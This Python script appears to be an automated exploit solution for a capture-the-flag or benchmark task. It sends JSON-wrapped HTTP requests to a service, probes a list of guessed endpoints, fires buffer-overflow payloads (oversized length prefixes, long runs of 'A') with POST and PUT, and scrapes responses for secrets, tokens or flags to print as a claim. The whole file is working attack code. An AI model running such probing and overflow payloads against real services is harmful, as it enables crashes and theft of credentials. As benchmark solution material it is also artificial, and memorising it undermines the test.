#!/usr/bin/env python3
import sys
import json
import base64
import binascii
import re

def send(path, method='GET', headers=None, body_hex=None):
    req = {'http': {'method': method, 'path': path}}
    if headers:
        req['http']['headers'] = headers
    if body_hex is not None:
        req['http']['body_hex'] = body_hex
    print(json.dumps(req), flush=True)
    line = sys.stdin.readline()
    if not line:
        return None
    try:
        return json.loads(line)
    except Exception:
        return None

def body_of(resp):
    if not resp:
        return b''
    b = resp.get('body_b64') or ''
    try:
        return base64.b64decode(b)
    except Exception:
        return b''

def find_secret(raw):
    if not raw:
        return None
    # JSON fields
    try:
        j = json.loads(raw.decode('utf-8', 'replace'))
        if isinstance(j, dict):
            for k in ('secret', 'secret_hex', 'token', 'flag', 'SECRET'):
                v = j.get(k)
                if isinstance(v, str) and len(v) >= 8:
                    return v
    except Exception:
        pass
    txt = raw.decode('latin-1', 'replace')
    m = re.search(r'(?i)secret[_\- ]?(?:hex)?\s*[:=]\s*["\']?([0-9a-fA-F]{8,256})', txt)
    if m:
        return m.group(1)
    m = re.search(r'\b([0-9a-fA-F]{32,256})\b', txt)
    if m:
        return m.group(1)
    return None

def try_all(path, body_hex=None, method='POST', headers=None):
    r = send(path, method, headers, body_hex)
    raw = body_of(r)
    s = find_secret(raw)
    if s:
        return s, r, raw
    return None, r, raw

def main():
    try:
        paths = ['/', '/parse', '/record', '/records', '/process', '/data', '/input',
                 '/upload', '/packet', '/message', '/read', '/rpc', '/cgi-bin/parse',
                 '/api', '/api/parse', '/health', '/index.html', '/debug']
        # Phase 1: discovery
        for p in paths:
            r = send(p, 'GET')
            raw = body_of(r)
            if raw:
                s = find_secret(raw)
                if s:
                    print('CLAIM:' + json.dumps({'secret_hex': s}), flush=True)
                    return
        # Phase 2: overflow payloads on likely paths
        payloads = []
        for le in (b'\x00\x01\x00\x00', b'\xff\xff\xff\xff', b'\x00\x00\xff\xff',
                   b'\x00\x00\x01\x00', b'\x00\x00\x00\x01'):
            payloads.append(le + b'A' * 64)
        payloads.append(b'A' * 4096)
        payloads.append(b'\x04\x00\x00\x00' + b'\x00' * 200)
        payloads.append(b'\xff\xff\xff\xff\x00' * 32)
        for p in paths:
            for pl in payloads:
                hx = binascii.hexlify(pl).decode('ascii')
                for m in ('POST', 'PUT'):
                    s, r, raw = try_all(p, hx, m)
                    if s:
                        print('CLAIM:' + json.dumps({'secret_hex': s}), flush=True)
                        return
                    if r and r.get('status') and r.get('status') >= 500:
                        s2 = find_secret(raw)
                        if s2:
                            print('CLAIM:' + json.dumps({'secret_hex': s2}), flush=True)
                            return
        print('CLAIM:' + json.dumps({'secret_hex': ''}), flush=True)
    except Exception:
        try:
            print('CLAIM:' + json.dumps({'secret_hex': ''}), flush=True)
        except Exception:
            pass

main()